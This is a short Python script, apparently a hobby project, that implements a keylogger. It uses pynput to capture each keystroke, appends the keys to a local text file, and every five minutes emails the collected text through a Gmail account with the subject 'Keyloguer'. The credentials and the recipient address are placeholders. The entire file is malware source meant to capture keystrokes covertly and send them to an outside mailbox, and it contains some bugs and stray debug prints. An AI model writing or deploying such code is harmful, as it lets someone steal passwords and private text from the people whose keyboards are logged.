
import time
import vexmail
from pynput.keyboard import Key, Listener
# Interval of time to send the logs
time_delay = 5
infos = vexmail.vex('gmail', 'e-mail', 'password')
log = open("lag.txt", "a+")
init_time = time.time()
v = []
p = False


def on_press(key):
    if(len(str(key)) <= 4):
        now_time = time.time()
        print("{} pressed".format(key))
        global v, init_time, p
        if(key == 'key.shift'):
            p = True
        else:
            if(p):
                v.append(str(key)[1].upper)
            else:
                v.append(str(key)[1])
        if((now_time-init_time)/60 >= time_delay):
            string = ("".join(v))
            init_time = now_time
            v = []
            print("Bananyu")
            # Saving a log file in txt format
            log.write(string)
            infos.send('e-mail to send', 'Keyloguer', string)


def on_release(key):
    # print("{} released".format(key))
    if key == Key.esc:
        return False


with Listener(
        on_press=on_press,
        on_release=on_release,
) as listener:
    listener.join()

print("Charmander")
